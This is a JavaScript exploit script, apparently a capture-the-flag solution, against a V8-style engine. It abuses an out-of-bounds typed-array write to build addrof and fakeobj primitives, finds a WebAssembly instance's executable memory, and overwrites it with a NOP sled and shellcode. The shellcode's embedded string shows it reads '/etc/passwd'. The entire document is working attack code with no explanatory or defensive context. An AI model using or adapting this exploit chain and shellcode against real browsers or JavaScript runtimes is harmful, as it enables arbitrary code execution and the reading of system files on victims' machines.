// wasm shellcode method
var buf = new ArrayBuffer(8); // 8 byte array buffer
var f64_buf = new Float64Array(buf);
var u64_buf = new Uint32Array(buf);

function ftoi(val) { // typeof(val) = float
    f64_buf[0] = val;
    return BigInt(u64_buf[0]) + (BigInt(u64_buf[1]) << 32n); // Watch for little endianness
}

function ftoi_32(val){
	f64_buf[0] = val;
	return u64_buf[0];
}

function itof(val) { // typeof(val) = BigInt
    u64_buf[0] = Number(val & 0xffffffffn);
    u64_buf[1] = Number(val >> 32n);
    return f64_buf[0];
}

function itof_32(val) { // typeof(val) = BigInt
    u64_buf[0] = Number(val & 0xffffffffn);
    return f64_buf[0];
}



var to_overflow = new Array();

to_overflow.push(new Uint32Array(0x4));
var temp_obj = {"A":1};
var fl_arr = [1.1, 1.2, 1.3, 1.4];
to_overflow.push([temp_obj]);
to_overflow.push(fl_arr);
to_overflow.push(new Uint32Array(0x10));


// %DebugPrint(to_overflow[0]);
// %DebugPrint(to_overflow[1]);
// %DebugPrint(to_overflow[2]);
// %DebugPrint(to_overflow[3]);

to_overflow[0].fill(0x400,12,13);

base = to_overflow[0][15];

float_map_idx = 42
obj_arr_map_idx = 49

float_map = to_overflow[0][float_map_idx];

obj_arr_map = to_overflow[0][obj_arr_map_idx];
uintlast_element_idx = 85
uintlast_map_idx = 83

uint_map = to_overflow[0][uintlast_map_idx];

function addrof(in_obj){
	to_overflow[1][0] = in_obj;
	to_overflow[0][obj_arr_map_idx] = float_map;
	let addr = to_overflow[1][0];
	to_overflow[0][obj_arr_map_idx] = obj_arr_map;
	return ftoi_32(addr);
}

function fakeobj(addr){
	to_overflow[2][0] = itof_32(addr);
	to_overflow[0][float_map_idx] = obj_arr_map;
	let fake = to_overflow[2][0];
	to_overflow[0][float_map_idx] = float_map;
	return fake;
}

var arb_rw_arr = new Uint32Array(0x10);

console.log("[+] Controlled float array: 0x" + addrof(arb_rw_arr).toString(16));
// arb_rw_arr.fill(0x400,12,13);


// function arb_read(addr){
// 	if (addr % 2n == 0){
// 		addr += 1n;
// 	}

// 	let fake = fakeobj(addrof(arb_rw_arr) - 0x20);
// 	arb_rw_arr[2] = itof_32


// }

var wasm_code = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
var wasm_mod = new WebAssembly.Module(wasm_code);
var wasm_instance = new WebAssembly.Instance(wasm_mod);
var f = wasm_instance.exports.main;

console.log("0x"+addrof(wasm_instance).toString(16));
wasm_addr_32 = addrof(wasm_instance);
arb_rw_arr.fill(0x400,12,13);
arb_rw_arr.fill(wasm_addr_32+0x60,18,19);
arb_rw_arr.fill(wasm_addr_32+0x60,28,29);
// %DebugPrint(arb_rw_arr);
// to_overflow[0][uintlast_element_idx] = wasm_addr_32+0x50;

wasm_addr = BigInt(arb_rw_arr[0]) + (BigInt(arb_rw_arr[1]) << 32n);
console.log("0x" + wasm_addr.toString(16));

var last_over = new Array();
last_over.push(new Uint32Array(0x4));
last_over.push(new Uint32Array(0x4));
last_over.push(new Uint32Array(0x4));

f();

last_over[0].fill(0x400,12,13);

last_over[0][50] = arb_rw_arr[1];
last_over[0][51] = arb_rw_arr[0];
last_over[0][47] = 0x200;
last_over[1]
for(var x = 0;x < 0xaf;x++){
	last_over[1][x] = 0x90909090;
}

last_over[1][0xae] = 0x90909090;
last_over[1][0xaf] = 0x90909090;
last_over[1][0xb0] = 0x90909090;
last_over[1][0xb1] = 0x90909090;
last_over[1][0xb2] = 0x90909090;
last_over[1][0xb3] = 0x90909090;


shellcode = [0x805f3feb,0x48410b77,0x204c031,0xff63148,0xec816605,0x8d480fff,0x89482434,0xd23148c7,0xfffba66,0xfc03148,0xff314805,0x1c78040,0x48c28948,0x104c031,0x3148050f,0xf3c04c0,0xffbce805,0x652fffff,0x702f6374,0x77737361,0x4164];

for (let i = 0; i < shellcode.length; i++) {
	last_over[1][0xb1+i] = shellcode[i];
}

f();
